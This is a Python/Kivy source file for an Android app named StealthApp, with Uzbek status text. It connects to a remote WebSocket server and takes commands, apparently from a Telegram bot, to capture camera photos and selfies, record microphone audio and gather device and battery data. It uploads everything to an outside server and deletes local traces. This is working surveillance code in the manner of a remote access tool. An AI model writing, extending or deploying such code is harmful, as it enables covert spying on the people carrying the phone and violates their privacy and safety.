import asyncio
import threading
import os
import shutil
import time
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.utils import platform

WS_URL = "wss://hild-tracking-backend.onrender.com/ws/device"
UPLOAD_URL = "https://hild-tracking-backend.onrender.com/upload"

status = ["Ishga tushirilmoqda..."]
should_reconnect = [True]
ws_ref = [None]


# --- KESH TOZALASH ---
def clear_app_cache():
    cleared = []
    try:
        if platform == 'android':
            from jnius import autoclass
            context = autoclass('org.kivy.android.PythonActivity').mActivity
            cache_dir = context.getCacheDir().getAbsolutePath()
            if os.path.exists(cache_dir):
                shutil.rmtree(cache_dir, ignore_errors=True)
                os.makedirs(cache_dir, exist_ok=True)
                cleared.append("App cache")
            try:
                code_cache = context.getCodeCacheDir().getAbsolutePath()
                if os.path.exists(code_cache):
                    shutil.rmtree(code_cache, ignore_errors=True)
                    os.makedirs(code_cache, exist_ok=True)
                    cleared.append("Code cache")
            except Exception:
                pass

        temp_files = ["/sdcard/capture.jpg", "/sdcard/selfie.jpg", "/sdcard/audio.m4a"]
        for f in temp_files:
            if os.path.exists(f):
                os.remove(f)
                cleared.append(os.path.basename(f))

        if cleared:
            status[0] = "Kesh tozalandi: " + ", ".join(cleared) + "\nQayta ulanilmoqda..."
        else:
            status[0] = "Kesh toza. Qayta ulanilmoqda..."
    except Exception as e:
        status[0] = "Kesh xatolik: " + str(e)


# --- MEDIA YUKLASH ---
async def upload_file(file_path, media_type):
    try:
        import aiohttp
        async with aiohttp.ClientSession() as session:
            with open(file_path, 'rb') as f:
                data = aiohttp.FormData()
                data.add_field('file', f, filename=os.path.basename(file_path))
                data.add_field('media_type', media_type)
                async with session.post(UPLOAD_URL, data=data) as resp:
                    status[0] = "Yuborildi! (" + str(resp.status) + ")"
        if os.path.exists(file_path):
            os.remove(file_path)
    except Exception as e:
        status[0] = "Upload xatolik: " + str(e)[:100]


async def send_text(text_data):
    try:
        import aiohttp
        async with aiohttp.ClientSession() as session:
            data = aiohttp.FormData()
            data.add_field('text', text_data)
            data.add_field('media_type', 'text')
            async with session.post(UPLOAD_URL, data=data) as resp:
                status[0] = "Ma'lumot yuborildi!"
    except Exception as e:
        status[0] = "Yuborish xatolik: " + str(e)[:100]


# --- QURILMA MA'LUMOTLARI ---
def get_battery_info():
    try:
        from jnius import autoclass
        context = autoclass('org.kivy.android.PythonActivity').mActivity
        Intent = autoclass('android.content.Intent')
        IntentFilter = autoclass('android.content.IntentFilter')
        BatteryManager = autoclass('android.os.BatteryManager')
        ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        battery_status = context.registerReceiver(None, ifilter)
        level = battery_status.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        scale = battery_status.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
        battery_pct = int(level * 100 / scale)
        status_val = battery_status.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        is_charging = status_val in [
            BatteryManager.BATTERY_STATUS_CHARGING,
            BatteryManager.BATTERY_STATUS_FULL
        ]
        charging_str = "Zaryadlanmoqda" if is_charging else "Zaryadlanmayapti"
        return "Batareya: " + str(battery_pct) + "%\n" + charging_str
    except Exception as e:
        return "Batareya xatolik: " + str(e)


def get_device_info():
    try:
        from jnius import autoclass
        Build = autoclass('android.os.Build')
        VERSION = autoclass('android.os.Build$VERSION')
        return (
            "Qurilma ma'lumotlari:\n"
            "Model: " + Build.MODEL + "\n"
            "Ishlab chiqaruvchi: " + Build.MANUFACTURER + "\n"
            "Android: " + VERSION.RELEASE + "\n"
            "SDK: " + str(VERSION.SDK_INT) + "\n"
            "Qurilma: " + Build.DEVICE
        )
    except Exception as e:
        return "Qurilma info xatolik: " + str(e)


# --- KAMERA ---
def take_photo_camera(camera_id, loop):
    try:
        from jnius import autoclass, PythonJavaClass, java_method
        Camera = autoclass('android.hardware.Camera')
        SurfaceTexture = autoclass('android.graphics.SurfaceTexture')
        FileOutputStream = autoclass('java.io.FileOutputStream')
        cam_name = "selfie" if camera_id == 1 else "capture"
        filepath = "/sdcard/" + cam_name + ".jpg"
        camera = Camera.open(camera_id)
        texture = SurfaceTexture(camera_id + 10)
        camera.setPreviewTexture(texture)
        camera.startPreview()
        done = [False]
        path = [None]

        class PicCb(PythonJavaClass):
            __javainterfaces__ = ['android/hardware/Camera$PictureCallback']
            __javacontext__ = 'app'
            @java_method('([BLandroid/hardware/Camera;)V')
            def onPictureTaken(self, data, cam):
                fos = FileOutputStream(filepath)
                fos.write(data)
                fos.close()
                cam.release()
                path[0] = filepath
                done[0] = True

        camera.takePicture(None, None, PicCb())
        for _ in range(30):
            if done[0]:
                break
            time.sleep(0.3)
        if path[0] and os.path.exists(path[0]):
            asyncio.run_coroutine_threadsafe(upload_file(path[0], "photo"), loop)
            status[0] = "Rasm olindi, yuborilmoqda..."
    except Exception as e:
        status[0] = "Kamera xatolik: " + str(e)


# --- AUDIO ---
def record_audio(loop):
    try:
        from jnius import autoclass
        MediaRecorder = autoclass('android.media.MediaRecorder')
        AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
        OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
        AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')
        filepath = "/sdcard/audio.m4a"
        recorder = MediaRecorder()
        recorder.setAudioSource(AudioSource.MIC)
        recorder.setOutputFormat(OutputFormat.MPEG_4)
        recorder.setAudioEncoder(AudioEncoder.AAC)
        recorder.setOutputFile(filepath)
        recorder.prepare()
        recorder.start()
        status[0] = "Yozilmoqda (10 sek)..."
        time.sleep(10)
        recorder.stop()
        recorder.release()
        if os.path.exists(filepath):
            asyncio.run_coroutine_threadsafe(upload_file(filepath, "audio"), loop)
    except Exception as e:
        status[0] = "Audio xatolik: " + str(e)


# --- WEBSOCKET ---
async def ws_loop():
    loop = asyncio.get_running_loop()
    retry = 0
    while should_reconnect[0]:
        try:
            import websockets
            retry += 1
            status[0] = "Ulanilmoqda... (" + str(retry) + "-urinish)\n" + WS_URL
            async with websockets.connect(
                WS_URL,
                ping_interval=30,
                ping_timeout=15,
                open_timeout=15,
                close_timeout=5,
            ) as ws:
                ws_ref[0] = ws
                retry = 0
                status[0] = "ULANDI!\nTelegram botdan buyruq bering."
                while True:
                    msg = await ws.recv()
                    status[0] = "Buyruq: " + msg
                    if msg == "take_photo":
                        threading.Thread(target=take_photo_camera, args=(0, loop), daemon=True).start()
                    elif msg == "selfie":
                        threading.Thread(target=take_photo_camera, args=(1, loop), daemon=True).start()
                    elif msg == "record_audio":
                        threading.Thread(target=record_audio, args=(loop,), daemon=True).start()
                    elif msg == "battery":
                        info = get_battery_info()
                        await send_text(info)
                        status[0] = info
                    elif msg == "device_info":
                        info = get_device_info()
                        await send_text(info)
                        status[0] = info
        except Exception as e:
            ws_ref[0] = None
            wait = min(5 * retry, 30)
            status[0] = "Xatolik:\n" + str(e)[:120] + "\n\n" + str(wait) + " soniyadan so'ng qayta..."
            await asyncio.sleep(wait)


# --- RUXSATLAR ---
def run_loop():
    try:
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.CAMERA,
                Permission.RECORD_AUDIO,
                Permission.INTERNET,
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_EXTERNAL_STORAGE,
            ])
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(ws_loop())
    except Exception as e:
        status[0] = "Ishga tushirishda xatolik:\n" + str(e)[:150]


def force_reconnect():
    should_reconnect[0] = False
    if ws_ref[0]:
        try:
            asyncio.run_coroutine_threadsafe(ws_ref[0].close(), asyncio.get_event_loop())
        except Exception:
            pass
    clear_app_cache()
    time.sleep(1)
    should_reconnect[0] = True
    threading.Thread(target=run_loop, daemon=True).start()


# --- UI ---
class StealthApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)

        self.label = Label(
            text="Ishga tushirilmoqda...",
            font_size='14sp',
            halign='center',
            valign='middle',
            size_hint=(1, 0.85),
            color=(1, 1, 1, 1),
        )
        self.label.bind(
            width=lambda instance, value: setattr(instance, 'text_size', (value, None))
        )

        btn = Button(
            text="Keshni tozala va qayta ulash",
            font_size='13sp',
            size_hint=(1, 0.15),
            background_color=(0.2, 0.5, 0.9, 1),
        )
        btn.bind(on_press=lambda x: threading.Thread(target=force_reconnect, daemon=True).start())

        layout.add_widget(self.label)
        layout.add_widget(btn)

        threading.Thread(target=run_loop, daemon=True).start()
        Clock.schedule_interval(self.update_ui, 1)
        return layout

    def update_ui(self, dt):
        self.label.text = status[0]


if __name__ == '__main__':
    StealthApp().run()
